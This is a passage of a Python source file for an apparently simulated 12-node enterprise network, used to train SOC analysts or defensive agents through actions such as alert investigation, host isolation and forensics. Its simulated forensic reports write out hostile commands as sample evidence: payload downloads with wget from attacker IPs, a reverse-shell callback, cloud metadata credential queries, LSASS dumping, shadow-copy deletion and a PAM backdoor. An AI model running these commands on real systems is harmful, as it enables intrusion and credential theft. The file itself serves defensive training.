"""Simulated 12-node enterprise network with defensive actions."""


import random
import time
from typing import Optional

try:
    from ..models import (
        ActionResult, AlertSeverity, AlertType, NetworkAlert,
        NetworkNode, NodeStatus, NodeType, ThreatLevel,
    )
except ImportError:
    from cyber_range.models import (
        ActionResult, AlertSeverity, AlertType, NetworkAlert,
        NetworkNode, NodeStatus, NodeType, ThreatLevel,
    )


# Default 12-node topology

def create_default_network() -> list[NetworkNode]:
    """Create the default 12-node enterprise network topology."""
    return [
        NetworkNode(
            node_id="fw-01", hostname="perimeter-fw", ip_address="10.0.0.1",
            node_type=NodeType.FIREWALL, os="PfSense 2.7",
            open_ports=[443, 8443], running_services=["firewall", "vpn"],
            is_critical=True,
        ),
        NetworkNode(
            node_id="dc-01", hostname="ad-controller", ip_address="10.0.1.1",
            node_type=NodeType.DOMAIN_CONTROLLER, os="Windows Server 2022",
            open_ports=[53, 88, 389, 636, 445],
            running_services=["dns", "kerberos", "ldap", "smb"],
            is_critical=True,
        ),
        NetworkNode(
            node_id="web-01", hostname="web-frontend", ip_address="10.0.2.1",
            node_type=NodeType.WEB_SERVER, os="Ubuntu 22.04",
            open_ports=[80, 443, 22],
            running_services=["nginx", "nodejs", "ssh"],
            is_critical=True,
            vulnerabilities=["CVE-2024-1234-nginx"],
        ),
        NetworkNode(
            node_id="mail-01", hostname="mail-server", ip_address="10.0.2.2",
            node_type=NodeType.MAIL_SERVER, os="Ubuntu 22.04",
            open_ports=[25, 587, 993, 22],
            running_services=["postfix", "dovecot", "ssh"],
            is_critical=True,
        ),
        NetworkNode(
            node_id="db-01", hostname="prod-database", ip_address="10.0.3.1",
            node_type=NodeType.DATABASE, os="CentOS 9",
            open_ports=[5432, 22],
            running_services=["postgresql", "ssh"],
            is_critical=True,
        ),
        NetworkNode(
            node_id="app-01", hostname="app-backend", ip_address="10.0.3.2",
            node_type=NodeType.APP_SERVER, os="Ubuntu 22.04",
            open_ports=[8080, 8443, 22],
            running_services=["java", "tomcat", "ssh"],
            is_critical=False,
        ),
        NetworkNode(
            node_id="ws-01", hostname="analyst-pc-1", ip_address="10.0.4.1",
            node_type=NodeType.WORKSTATION, os="Windows 11",
            open_ports=[445, 3389],
            running_services=["smb", "rdp"],
            is_critical=False,
        ),
        NetworkNode(
            node_id="ws-02", hostname="dev-pc-1", ip_address="10.0.4.2",
            node_type=NodeType.WORKSTATION, os="Windows 11",
            open_ports=[445, 3389],
            running_services=["smb", "rdp"],
            is_critical=False,
        ),
        NetworkNode(
            node_id="ws-03", hostname="hr-pc-1", ip_address="10.0.4.3",
            node_type=NodeType.WORKSTATION, os="Windows 11",
            open_ports=[445, 3389],
            running_services=["smb", "rdp"],
            is_critical=False,
        ),
        NetworkNode(
            node_id="ws-04", hostname="exec-pc-1", ip_address="10.0.4.4",
            node_type=NodeType.WORKSTATION, os="macOS 14",
            open_ports=[22, 5900],
            running_services=["ssh", "vnc"],
            is_critical=False,
        ),
        NetworkNode(
            node_id="honey-01", hostname="honeypot-svr", ip_address="10.0.5.1",
            node_type=NodeType.HONEYPOT, os="Debian 12",
            open_ports=[],
            running_services=[],
            is_critical=False,
        ),
        NetworkNode(
            node_id="backup-01", hostname="backup-server", ip_address="10.0.6.1",
            node_type=NodeType.BACKUP_SERVER, os="Ubuntu 22.04",
            open_ports=[22, 873],
            running_services=["ssh", "rsync", "borg-backup"],
            is_critical=True,
        ),
    ]




class NetworkSimulator:
    """
    Simulates a 12-node enterprise network for SOC analyst training.

    Manages network topology, host statuses, SIEM alerts, and executes
    defensive actions taken by the agent.
    """

    def __init__(self, seed: Optional[int] = None) -> None:
        self._rng = random.Random(seed)
        self.nodes: dict[str, NetworkNode] = {}
        self.alerts: dict[str, NetworkAlert] = {}
        self.blocked_ips: set[str] = set()
        self.honeypot_deployed: bool = False
        self.honeypot_intel: list[str] = []
        self._alert_counter: int = 0
        self._start_time: float = 0.0
        self._step_count: int = 0
        self._budget: float = 100.0
        self._initial_budget: float = 100.0
        self._forensics_results: dict[str, dict] = {}

    def initialize(self, seed: Optional[int] = None) -> None:
        """Reset the network to clean state."""
        if seed is not None:
            self._rng = random.Random(seed)
        self.nodes = {n.node_id: n for n in create_default_network()}
        self.alerts = {}
        self.blocked_ips = set()
        self.honeypot_deployed = False
        self.honeypot_intel = []
        self._alert_counter = 0
        self._start_time = time.time()
        self._step_count = 0
        self._budget = 100.0
        self._forensics_results = {}

    def get_node(self, node_id: str) -> Optional[NetworkNode]:
        """Get a network node by ID."""
        return self.nodes.get(node_id)

    def compromise_node(self, node_id: str, step: int) -> bool:
        """Mark a node as compromised (called by attack engine)."""
        node = self.nodes.get(node_id)
        if node and node.status == NodeStatus.HEALTHY:
            node.status = NodeStatus.COMPROMISED
            node.compromised_at_step = step
            return True
        return False

    def encrypt_node(self, node_id: str) -> bool:
        """Mark a node as encrypted by ransomware."""
        node = self.nodes.get(node_id)
        if node and node.status in (NodeStatus.HEALTHY, NodeStatus.COMPROMISED):
            node.status = NodeStatus.ENCRYPTED
            return True
        return False

    # --- Agent Actions ---


    def investigate_alert(self, alert_id: str) -> ActionResult:
        """Deep-dive investigation into a specific alert."""
        alert = self.alerts.get(alert_id)
        if not alert:
            return ActionResult(
                action_type="investigate_alert", success=False,
                description=f"Alert {alert_id} not found.",
                resource_cost=0.5,
            )

        alert.investigated = True
        self._budget -= 1.0

        node = self.nodes.get(alert.related_node_id)
        node_os = node.os if node else "Unknown"

        # -------------------------------------------------------------------
        # Generate realistic, structured forensic evidence
        # -------------------------------------------------------------------
        if alert.is_false_positive:
            fp_explanations = {
                AlertType.BRUTE_FORCE: {
                    "forensic_evidence": (
                        f"Automated analysis of authentication logs on {alert.related_node_id} ({node_os}). "
                        f"Identified 23 failed SSH attempts from {alert.source_ip} between 03:14-03:17 UTC. "
                        f"Source IP resolves to monitoring.internal.corp (Nagios health check agent). "
                        f"Authentication pattern matches scheduled credential rotation policy. "
                        f"No unauthorized sessions established. Verdict: BENIGN — routine monitoring activity."
                    ),
                    "ioc_summary": {"malicious_indicators": 0, "benign_indicators": 4},
                },
                AlertType.ANOMALOUS_TRAFFIC: {
                    "forensic_evidence": (
                        f"NetFlow analysis on {alert.related_node_id}: Detected 847MB egress to 52.216.x.x (AWS S3) "
                        f"over port 443/TLS 1.3. Correlated with scheduled backup job (cron: 0 2 * * *). "
                        f"Process tree: systemd(1) → cron(892) → backup.sh(14023) → aws-cli(14089). "
                        f"S3 bucket matches authorized backup destination. Data volume consistent with "
                        f"daily incremental backup (avg 800-900MB). Verdict: BENIGN — scheduled backup."
                    ),
                    "ioc_summary": {"malicious_indicators": 0, "benign_indicators": 5},
                },
                AlertType.PHISHING: {
                    "forensic_evidence": (
                        f"Email header analysis for alert on {alert.related_node_id}: "
                        f"Subject: 'Q4 Budget Review — Action Required'. Sender: cfo@company.com. "
                        f"SPF=pass, DKIM=pass, DMARC=pass. Attachment: Q4_Budget_2024.xlsx (SHA256: "
                        f"7a8b2c{self._rng.randint(100000,999999)}). VirusTotal: 0/72 detections. "
                        f"Macro analysis: No VBA macros present. File metadata consistent with "
                        f"Microsoft Office 365 origin. Verdict: BENIGN — legitimate internal email."
                    ),
                    "ioc_summary": {"malicious_indicators": 0, "benign_indicators": 6},
                },
            }
            fp_data = fp_explanations.get(alert.alert_type, {
                "forensic_evidence": (
                    f"Analysis of {alert.related_node_id} shows routine system processes. "
                    f"All running services match expected baseline. No anomalous network connections "
                    f"or file modifications detected. Verdict: BENIGN."
                ),
                "ioc_summary": {"malicious_indicators": 0, "benign_indicators": 3},
            })
            evidence = fp_data["forensic_evidence"]
            ioc_summary = fp_data["ioc_summary"]
        else:
            # Real threat — generate detailed IOCs
            threat_evidence = {
                AlertType.BRUTE_FORCE: {
                    "forensic_evidence": (
                        f"CRITICAL: Brute force attack confirmed on {alert.related_node_id} ({node_os}). "
                        f"Source: {alert.source_ip} (GeoIP: Moscow, Russia — ASN 197414). "
                        f"12,847 authentication attempts in 180 seconds targeting root, admin, ubuntu accounts. "
                        f"Tool signature matches Hydra v9.4 (User-Agent pattern). "
                        f"Successful login detected at 14:23:41 UTC → spawned /bin/bash (PID 28341). "
                        f"Post-compromise: wget http://{alert.source_ip}/payload.sh → chmod +x → executed. "
                        f"MITRE: T1110.001 (Brute Force: Password Guessing). "
                        f"Recommend: Block {alert.source_ip}, isolate {alert.related_node_id}, rotate all credentials."
                    ),
                    "ioc_summary": {"malicious_indicators": 7, "benign_indicators": 0},
                    "mitre_techniques": ["T1110.001"],
                },
                AlertType.INTRUSION: {
                    "forensic_evidence": (
                        f"CRITICAL: Active intrusion on {alert.related_node_id} ({node_os}). "
                        f"Exploit: CVE-2024-1234 (nginx path traversal → RCE). "
                        f"Attack vector: crafted HTTP request to /.%2e/.%2e/etc/passwd. "
                        f"Process tree: nginx(1204) → sh(28901) → python3(28923) → reverse_shell. "
                        f"Reverse shell established to {alert.source_ip}:4444 (Cobalt Strike beacon signature). "
                        f"Beacon interval: 60s, jitter: 15%. C2 protocol: HTTPS over port 443. "
                        f"Memory analysis: Cobalt Strike reflective DLL at 0x7fff2340 (SHA256: 3e4a8f...). "
                        f"MITRE: T1190 (Exploit Public-Facing Application), T1059.004 (Unix Shell). "
                        f"Recommend: Isolate immediately, block C2 IP, initiate full IR."
                    ),
                    "ioc_summary": {"malicious_indicators": 9, "benign_indicators": 0},
                    "mitre_techniques": ["T1190", "T1059.004"],
                },
                AlertType.PHISHING: {
                    "forensic_evidence": (
                        f"CONFIRMED PHISHING on {alert.related_node_id} ({node_os}). "
                        f"Email: 'Urgent: Password Expiry Notice' from support@c0mpany.com (typosquat). "
                        f"SPF=fail, DKIM=none, DMARC=fail. Attachment: Update_Credentials.docm "
                        f"(SHA256: 9f2d71{self._rng.randint(100000,999999)}). VT: 47/72 detections (Emotet). "
                        f"Macro executed: powershell -enc {self._rng.randbytes(8).hex()}... "
                        f"→ Downloaded payload from hxxps://cdn-update[.]xyz/stage2.dll "
                        f"→ Injected into explorer.exe (PID 4820) via process hollowing. "
                        f"C2 callback to 94.232.46.19:8443 every 30s. "
                        f"MITRE: T1566.001 (Spearphishing Attachment), T1204.002 (Malicious File). "
                        f"Recommend: Isolate host, reset user credentials, scan all recipients."
                    ),
                    "ioc_summary": {"malicious_indicators": 8, "benign_indicators": 0},
                    "mitre_techniques": ["T1566.001", "T1204.002"],
                },
                AlertType.LATERAL_MOVEMENT: {
                    "forensic_evidence": (
                        f"LATERAL MOVEMENT detected targeting {alert.related_node_id} ({node_os}). "
                        f"Source: internal host using stolen domain admin credentials (Administrator@CORP). "
                        f"Authentication: NTLM pass-the-hash from {alert.source_ip}. "
                        f"SMB session established → PsExec service installed (PSEXESVC). "
                        f"Processes spawned: cmd.exe → whoami /all → net user /domain → nltest /dclist. "
                        f"Credential dumping: procdump.exe -ma lsass.exe → exfil via SMB. "
                        f"MITRE: T1021.002 (SMB/Windows Admin Shares), T1003.001 (LSASS Memory). "
                        f"Recommend: Isolate source and target, invalidate all domain admin tokens."
                    ),
                    "ioc_summary": {"malicious_indicators": 8, "benign_indicators": 0},
                    "mitre_techniques": ["T1021.002", "T1003.001"],
                },
                AlertType.PRIVILEGE_ESCALATION: {
                    "forensic_evidence": (
                        f"PRIVILEGE ESCALATION on {alert.related_node_id} ({node_os}). "
                        f"Mimikatz detected in memory (PID 31204, SHA256: a1b2c3{self._rng.randint(100000,999999)}). "
                        f"sekurlsa::logonpasswords executed — extracted 14 credential sets. "
                        f"Token impersonation: ImpersonateNamedPipeClient() → SYSTEM privileges obtained. "
                        f"DCSync attack detected: DsGetNCChanges request to dc-01 replicating "
                        f"CN=krbtgt,CN=Users,DC=corp,DC=local. Golden Ticket capability achieved. "
                        f"MITRE: T1003.001 (LSASS Memory), T1134.001 (Token Impersonation). "
                        f"Recommend: Reset krbtgt password TWICE, isolate host, full AD audit."
                    ),
                    "ioc_summary": {"malicious_indicators": 9, "benign_indicators": 0},
                    "mitre_techniques": ["T1003.001", "T1134.001"],
                },
                AlertType.EXFILTRATION: {
                    "forensic_evidence": (
                        f"DATA EXFILTRATION in progress from {alert.related_node_id} ({node_os}). "
                        f"Unusual egress: {self._rng.randint(2,15)}GB transferred to {alert.source_ip}:443 "
                        f"over TLS 1.2 (Certificate: self-signed, CN=cloudflare-cdn[.]xyz). "
                        f"DNS tunneling also detected: {self._rng.randint(500,2000)} TXT queries to "
                        f"data.{self._rng.randbytes(4).hex()}.exfil[.]cc (avg 230 bytes/query). "
                        f"Data staged in C:\\Users\\Public\\Documents\\.cache\\ (7z compressed, AES-256). "
                        f"Contents: database dumps (customers.sql, financials.sql), SSH keys, AD exports. "
                        f"MITRE: T1041 (Exfil Over C2 Channel), T1048.003 (DNS Tunneling). "
                        f"Recommend: Block C2 immediately, isolate host, assess data loss scope."
                    ),
                    "ioc_summary": {"malicious_indicators": 10, "benign_indicators": 0},
                    "mitre_techniques": ["T1041", "T1048.003"],
                },
                AlertType.RANSOMWARE: {
                    "forensic_evidence": (
                        f"RANSOMWARE ACTIVE on {alert.related_node_id} ({node_os}). "
                        f"Binary: svchost32.exe (SHA256: e7f8a9{self._rng.randint(100000,999999)}). VT: 63/72. "
                        f"Family: LockBit 3.0 (Black). Encryption: AES-256-CBC + RSA-2048. "
                        f"Extension: .locked. {self._rng.randint(1200,8000)} files encrypted in 47 seconds. "
                        f"Ransom note: README_RESTORE.txt in every directory. "
                        f"Lateral propagation via SMB (port 445) — scanning 10.0.4.0/24. "
                        f"Volume Shadow copies deleted: vssadmin delete shadows /all /quiet. "
                        f"MITRE: T1486 (Data Encrypted for Impact), T1490 (Inhibit System Recovery). "
                        f"Recommend: ISOLATE ALL ADJACENT HOSTS IMMEDIATELY. Protect backup-01."
                    ),
                    "ioc_summary": {"malicious_indicators": 11, "benign_indicators": 0},
                    "mitre_techniques": ["T1486", "T1490"],
                },
            }

            t_data = threat_evidence.get(alert.alert_type, {
                "forensic_evidence": (
                    f"Analysis confirms malicious activity on {alert.related_node_id}. "
                    f"Source: {alert.source_ip}. Recommend immediate containment."
                ),
                "ioc_summary": {"malicious_indicators": 3, "benign_indicators": 0},
                "mitre_techniques": [],
            })
            evidence = t_data["forensic_evidence"]
            ioc_summary = t_data["ioc_summary"]

        details = {
            "alert_id": alert.alert_id,
            "severity": alert.severity.value,
            "alert_type": alert.alert_type.value,
            "source_ip": alert.source_ip,
            "destination_ip": alert.destination_ip,
            "related_node": alert.related_node_id,
            "confidence": alert.confidence,
            "raw_log": alert.raw_log,
            "forensic_evidence": evidence,
            "ioc_summary": ioc_summary,
        }

        return ActionResult(
            action_type="investigate_alert", success=True,
            description=f"Investigation of alert {alert_id} complete.",
            intel_gathered=0.5 if not alert.is_false_positive else 0.1,
            resource_cost=1.0,
            details=details,
        )

    def isolate_host(self, node_id: str) -> ActionResult:
        """Quarantine a host from the network."""
        node = self.nodes.get(node_id)
        if not node:
            return ActionResult(
                action_type="isolate_host", success=False,
                description=f"Node {node_id} not found.",
                resource_cost=0.5,
            )

        if node.status == NodeStatus.ISOLATED:
            return ActionResult(
                action_type="isolate_host", success=False,
                description=f"Node {node_id} is already isolated.",
                resource_cost=0.5,
            )

        was_compromised = node.status in (NodeStatus.COMPROMISED, NodeStatus.ENCRYPTED)
        was_healthy = node.status == NodeStatus.HEALTHY
        critical_disrupted = node.is_critical and was_healthy

        node.status = NodeStatus.ISOLATED
        node.isolated_at_step = self._step_count
        self._budget -= 3.0

        return ActionResult(
            action_type="isolate_host", success=True,
            description=f"Host {node_id} ({node.hostname}) has been isolated from the network.",
            threat_neutralized=was_compromised,
            threat_severity_multiplier=2.0 if node.is_critical else 1.0,
            healthy_host_isolated=was_healthy,
            critical_services_disrupted=critical_disrupted,
            resource_cost=3.0,
            health_delta=0.05 if was_compromised else -0.10,
        )

    def block_ip(self, ip_address: str) -> ActionResult:
        """Block an IP address at the firewall."""
        if ip_address in self.blocked_ips:
            return ActionResult(
                action_type="block_ip", success=False,
                description=f"IP {ip_address} is already blocked.",
                resource_cost=0.2,
            )

        # Check if it's an internal IP (blocking internal = bad)
        is_internal = ip_address.startswith("10.0.")
        internal_node = None
        if is_internal:
            for node in self.nodes.values():
                if node.ip_address == ip_address:
                    internal_node = node
                    break

        self.blocked_ips.add(ip_address)
        self._budget -= 0.5

        # Blocking an attacker IP neutralizes related alerts
        threat_neutralized = not is_internal
        critical_disrupted = internal_node is not None and internal_node.is_critical

        return ActionResult(
            action_type="block_ip", success=True,
            description=f"IP {ip_address} blocked at firewall. {'WARNING: This is an internal IP!' if is_internal else 'External threat blocked.'}",
            threat_neutralized=threat_neutralized,
            threat_severity_multiplier=1.5,
            healthy_host_isolated=is_internal and internal_node is not None and internal_node.status == NodeStatus.HEALTHY,
            critical_services_disrupted=critical_disrupted,
            resource_cost=0.5,
            health_delta=0.03 if threat_neutralized else -0.05,
        )

    def run_forensics(self, node_id: str) -> ActionResult:
        """
        Run deep memory and disk forensics on a host.

        Returns structured findings including:
        - Process tree with PIDs, parent chains, and command lines
        - Network connections with states, bytes transferred, protocols
        - File artifacts with SHA-256 hashes, sizes, timestamps
        - Memory indicators (malware signatures, injected code)
        - OS-specific registry/config modifications
        - Timeline of suspicious events
        """
        node = self.nodes.get(node_id)
        if not node:
            return ActionResult(
                action_type="run_forensics", success=False,
                description=f"Node {node_id} not found.",
                resource_cost=1.0,
            )

        self._budget -= 5.0
        is_compromised = node.status in (NodeStatus.COMPROMISED, NodeStatus.ENCRYPTED)
        is_encrypted = node.status == NodeStatus.ENCRYPTED
        is_windows = "windows" in node.os.lower() or "win" in node.os.lower()
        timestamp = f"2024-03-15T{14 + self._rng.randint(0,8):02d}:{self._rng.randint(10,59):02d}:{self._rng.randint(10,59):02d}Z"

        findings = {
            "node_id": node_id,
            "hostname": node.hostname,
            "os": node.os,
            "status_at_scan": node.status.value,
            "scan_timestamp": timestamp,
        }

        if is_compromised:
            # --- Process Tree ---
            base_pid = self._rng.randint(2000, 30000)
            if is_windows:
                processes = [
                    {"pid": 4, "ppid": 0, "name": "System", "user": "NT AUTHORITY\\SYSTEM",
                     "cmd": "System", "suspicious": False},
                    {"pid": 812, "ppid": 4, "name": "smss.exe", "user": "NT AUTHORITY\\SYSTEM",
                     "cmd": "\\SystemRoot\\System32\\smss.exe", "suspicious": False},
                    {"pid": 1204, "ppid": 812, "name": "csrss.exe", "user": "NT AUTHORITY\\SYSTEM",
                     "cmd": "csrss.exe ObjectDirectory=\\Windows", "suspicious": False},
                    {"pid": base_pid, "ppid": 1204, "name": "svchost.exe", "user": "NT AUTHORITY\\SYSTEM",
                     "cmd": f"C:\\Windows\\Temp\\svchost.exe -k netsvcs",
                     "suspicious": True, "note": "ANOMALY: svchost.exe running from Temp directory"},
                    {"pid": base_pid + 12, "ppid": base_pid, "name": "cmd.exe", "user": "CORP\\Administrator",
                     "cmd": "cmd.exe /c whoami /all && net user /domain && nltest /dclist:",
                     "suspicious": True, "note": "Reconnaissance commands"},
                    {"pid": base_pid + 34, "ppid": base_pid, "name": "powershell.exe", "user": "CORP\\Administrator",
                     "cmd": f"powershell -nop -w hidden -enc {self._rng.randbytes(12).hex()}",
                     "suspicious": True, "note": "Encoded PowerShell — likely C2 stager"},
                ]
                if node.node_type in (NodeType.DOMAIN_CONTROLLER, NodeType.WORKSTATION):
                    processes.append({
                        "pid": base_pid + 67, "ppid": base_pid + 34, "name": "procdump64.exe",
                        "user": "CORP\\Administrator",
                        "cmd": "procdump64.exe -accepteula -ma lsass.exe lsass.dmp",
                        "suspicious": True, "note": "CRITICAL: LSASS credential dumping (T1003.001)",
                    })
            else:
                processes = [
                    {"pid": 1, "ppid": 0, "name": "systemd", "user": "root",
                     "cmd": "/sbin/init", "suspicious": False},
                    {"pid": 892, "ppid": 1, "name": "sshd", "user": "root",
                     "cmd": "/usr/sbin/sshd -D", "suspicious": False},
                    {"pid": base_pid, "ppid": 892, "name": "bash", "user": "root",
                     "cmd": "-bash", "suspicious": True, "note": "Interactive shell from SSH"},
                    {"pid": base_pid + 5, "ppid": base_pid, "name": "wget", "user": "root",
                     "cmd": f"wget -q http://185.220.101.42/implant -O /tmp/.cache",
                     "suspicious": True, "note": "Downloading remote payload"},
                    {"pid": base_pid + 12, "ppid": base_pid, "name": "python3", "user": "root",
                     "cmd": f"python3 /tmp/.cache --callback 185.220.101.42:4444",
                     "suspicious": True, "note": "Reverse shell / C2 beacon"},
                    {"pid": base_pid + 18, "ppid": base_pid + 12, "name": "curl", "user": "root",
                     "cmd": f"curl -s http://169.254.169.254/latest/meta-data/iam/",
                     "suspicious": True, "note": "Cloud metadata enumeration (T1552.005)"},
                ]

            # --- Network Connections ---
            connections = [
                {"local_addr": f"{node.ip_address}:{self._rng.randint(40000,60000)}",
                 "remote_addr": f"185.220.101.42:{4444 + self._rng.randint(0,3)}",
                 "state": "ESTABLISHED", "protocol": "TCP",
                 "pid": base_pid + 12, "bytes_sent": self._rng.randint(1200, 45000),
                 "bytes_recv": self._rng.randint(800, 12000),
                 "note": "C2 beacon — Cobalt Strike (MITRE: T1071.001)"},
            ]
            if node.node_type in (NodeType.DATABASE, NodeType.APP_SERVER):
                connections.append({
                    "local_addr": f"{node.ip_address}:{self._rng.randint(40000,60000)}",
                    "remote_addr": f"94.232.46.19:443",
                    "state": "ESTABLISHED", "protocol": "TCP",
                    "pid": base_pid + 34, "bytes_sent": self._rng.randint(500000, 5000000),
                    "bytes_recv": self._rng.randint(200, 1000),
                    "note": "Data exfiltration — large outbound transfer (MITRE: T1041)"})

            # --- File Artifacts ---
            if is_windows:
                file_artifacts = [
                    {"path": f"C:\\Windows\\Temp\\svchost.exe",
                     "sha256": f"e7f8a9{self._rng.randbytes(13).hex()}",
                     "size_bytes": self._rng.randint(45000, 180000),
                     "modified": timestamp,
                     "vt_detection": f"{self._rng.randint(38,65)}/72",
                     "note": "Masquerading as system binary (MITRE: T1036.005)"},
                    {"path": f"C:\\Users\\Public\\Documents\\.cache\\stage2.dll",
                     "sha256": f"3e4a8f{self._rng.randbytes(13).hex()}",
                     "size_bytes": self._rng.randint(230000, 450000),
                     "modified": timestamp,
                     "vt_detection": f"{self._rng.randint(42,58)}/72",
                     "note": "Second-stage payload — Cobalt Strike DLL"},
                ]
                if node.node_type in (NodeType.DOMAIN_CONTROLLER, NodeType.WORKSTATION):
                    file_artifacts.append({
                        "path": "C:\\Windows\\Temp\\lsass.dmp",
                        "sha256": f"9f2d71{self._rng.randbytes(13).hex()}",
                        "size_bytes": self._rng.randint(40000000, 120000000),
                        "modified": timestamp,
                        "vt_detection": "N/A (memory dump)",
                        "note": "LSASS process dump — contains domain credentials"})
            else:
                file_artifacts = [
                    {"path": "/tmp/.cache",
                     "sha256": f"b2c3d4{self._rng.randbytes(13).hex()}",
                     "size_bytes": self._rng.randint(18000, 95000),
                     "modified": timestamp,
                     "vt_detection": f"{self._rng.randint(35,55)}/72",
                     "note": "Hidden binary — reverse shell implant"},
                    {"path": "/var/tmp/.systemd-private/update.sh",
                     "sha256": f"5a6b7c{self._rng.randbytes(13).hex()}",
                     "size_bytes": self._rng.randint(800, 4000),
                     "modified": timestamp,
                     "vt_detection": f"{self._rng.randint(15,30)}/72",
                     "note": "Persistence cron script (MITRE: T1053.003)"},
                ]

            # --- Memory Indicators ---
            memory_indicators = [
                f"Cobalt Strike beacon signature at 0x{self._rng.randbytes(4).hex()} (watermark: {self._rng.randint(100000, 999999)})",
                f"Reflective DLL injection detected in PID {base_pid} (MZ header in heap at 0x{self._rng.randbytes(4).hex()})",
            ]
            if node.node_type in (NodeType.DOMAIN_CONTROLLER, NodeType.WORKSTATION):
                memory_indicators.extend([
                    f"Mimikatz module 'sekurlsa' loaded in PID {base_pid + 67}",
                    f"Kerberos TGT extracted: krbtgt@CORP.LOCAL (RC4-HMAC, expires 2024-03-25)",
                ])
            if is_encrypted:
                memory_indicators.append(
                    f"LockBit 3.0 encryption threads active ({self._rng.randint(4,16)} worker threads)")

            # --- OS-Specific Modifications ---
            if is_windows:
                os_modifications = {
                    "registry": [
                        {"key": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                         "value": "WindowsUpdate",
                         "data": "C:\\Windows\\Temp\\svchost.exe",
                         "note": "Persistence — auto-start on boot (MITRE: T1547.001)"},
                        {"key": "HKLM\\SYSTEM\\CurrentControlSet\\Services\\PSEXESVC",
                         "value": "ImagePath",
                         "data": "%SystemRoot%\\PSEXESVC.exe",
                         "note": "PsExec service — lateral movement tool"},
                    ],
                    "scheduled_tasks": [
                        {"name": "WindowsDefenderUpdate",
                         "action": "C:\\Windows\\Temp\\svchost.exe --silent",
                         "trigger": "On system startup",
                         "note": "Fake Windows Defender task for persistence"},
                    ],
                    "event_log_gaps": [
                        {"log": "Security", "gap_start": timestamp, "gap_duration_minutes": 12,
                         "note": "Event logs cleared — anti-forensics (MITRE: T1070.001)"},
                    ],
                }
            else:
                os_modifications = {
                    "crontab": [
                        {"schedule": "*/5 * * * *",
                         "command": "/var/tmp/.systemd-private/update.sh",
                         "user": "root",
                         "note": "Persistence — cron beacon every 5 minutes (MITRE: T1053.003)"},
                    ],
                    "ssh_keys": [
                        {"file": "/root/.ssh/authorized_keys",
                         "key_fingerprint": f"SHA256:{self._rng.randbytes(16).hex()[:43]}",
                         "added_at": timestamp,
                         "note": "Unauthorized SSH key added (MITRE: T1098.004)"},
                    ],
                    "modified_configs": [
                        {"file": "/etc/pam.d/sshd", "change": "auth sufficient pam_permit.so added",
                         "note": "PAM backdoor — allows authentication bypass"},
                    ],
                    "log_tampering": [
                        {"file": "/var/log/auth.log", "action": "truncated",
                         "original_size": "2.4MB", "current_size": "0 bytes",
                         "note": "Logs wiped — anti-forensics (MITRE: T1070.002)"},
                    ],
                }

            findings["malware_found"] = True
            findings["process_tree"] = processes
            findings["network_connections"] = connections
            findings["file_artifacts"] = file_artifacts
            findings["memory_indicators"] = memory_indicators
            findings["os_modifications"] = os_modifications
            findings["credential_theft_detected"] = node.node_type in (
                NodeType.DOMAIN_CONTROLLER, NodeType.WORKSTATION
            )
            findings["recommendation"] = (
                f"Host is {'ENCRYPTED (RANSOMWARE)' if is_encrypted else 'COMPROMISED'}. "
                f"Isolate immediately. {'Restore from backup — decryption unlikely without key.' if is_encrypted else 'Restore from backup to eradicate persistence.'}"
            )
            findings["risk_score"] = self._rng.randint(85, 99)
        else:
            # Clean host — realistic baseline report
            findings["malware_found"] = False
            findings["process_tree"] = [
                {"pid": 1, "ppid": 0, "name": "systemd" if "ubuntu" in node.os.lower() or "centos" in node.os.lower() else "System",
                 "user": "root" if "ubuntu" in node.os.lower() else "SYSTEM", "cmd": "init", "suspicious": False},
            ] + [
                {"pid": self._rng.randint(500, 5000), "ppid": 1, "name": svc,
                 "user": "root" if "ubuntu" in node.os.lower() else "SYSTEM",
                 "cmd": f"/usr/sbin/{svc}" if "ubuntu" in node.os.lower() else svc,
                 "suspicious": False}
                for svc in node.running_services[:3]
            ]
            findings["network_connections"] = [
                {"local_addr": f"{node.ip_address}:{port}", "remote_addr": "0.0.0.0:0",
                 "state": "LISTEN", "protocol": "TCP", "pid": self._rng.randint(500, 5000),
                 "bytes_sent": 0, "bytes_recv": 0, "note": "Normal listening service"}
                for port in node.open_ports[:3]
            ]
            findings["file_artifacts"] = []
            findings["memory_indicators"] = ["No malicious signatures detected in memory scan"]
            findings["os_modifications"] = {}
            findings["credential_theft_detected"] = False
            findings["recommendation"] = "No evidence of compromise. Host appears clean."
            findings["risk_score"] = self._rng.randint(2, 15)

        self._forensics_results[node_id] = findings

        return ActionResult(
            action_type="run_forensics", success=True,
            description=f"Deep forensic analysis of {node_id} ({node.hostname}) complete.",
            intel_gathered=1.5 if is_compromised else 0.2,
            resource_cost=5.0,
            details=findings,
        )

    def deploy_patch(self, node_id: str) -> ActionResult:
        """Push a security patch to a vulnerable host."""
        node = self.nodes.get(node_id)
        if not node:
            return ActionResult(
                action_type="deploy_patch", success=False,
                description=f"Node {node_id} not found.",
                resource_cost=1.0,
            )

        if node.status in (NodeStatus.ISOLATED, NodeStatus.OFFLINE, NodeStatus.ENCRYPTED):
            return ActionResult(
                action_type="deploy_patch", success=False,
                description=f"Cannot deploy patch to {node_id} — host is {node.status.value}.",
                resource_cost=0.5,
            )

        patched_vulns = list(node.vulnerabilities)
        node.vulnerabilities = []
        self._budget -= 2.0

        return ActionResult(
            action_type="deploy_patch", success=True,
            description=f"Security patch applied to {node_id}. Patched: {patched_vulns if patched_vulns else 'no known vulnerabilities'}.",
            resource_cost=2.0,
            health_delta=0.02 if patched_vulns else 0.0,
            details={"patched_vulnerabilities": patched_vulns},
        )

    def restore_backup(self, node_id: str) -> ActionResult:
        """Restore a compromised host from backup."""
        node = self.nodes.get(node_id)
        if not node:
            return ActionResult(
                action_type="restore_backup", success=False,
                description=f"Node {node_id} not found.",
                resource_cost=1.0,
            )

        was_compromised = node.status in (NodeStatus.COMPROMISED, NodeStatus.ENCRYPTED)
        if not was_compromised and node.status != NodeStatus.ISOLATED:
            return ActionResult(
                action_type="restore_backup", success=False,
                description=f"Node {node_id} doesn't need restoration — status is {node.status.value}.",
                resource_cost=0.5,
            )

        node.status = NodeStatus.HEALTHY
        node.compromised_at_step = -1
        node.vulnerabilities = []
        self._budget -= 8.0

        return ActionResult(
            action_type="restore_backup", success=True,
            description=f"Host {node_id} restored from backup. Now healthy.",
            threat_neutralized=was_compromised,
            threat_severity_multiplier=1.5 if node.is_critical else 1.0,
            resource_cost=8.0,
            health_delta=0.08,
        )

    def dismiss_alert(self, alert_id: str) -> ActionResult:
        """Dismiss an alert as a false positive."""
        alert = self.alerts.get(alert_id)
        if not alert:
            return ActionResult(
                action_type="dismiss_alert", success=False,
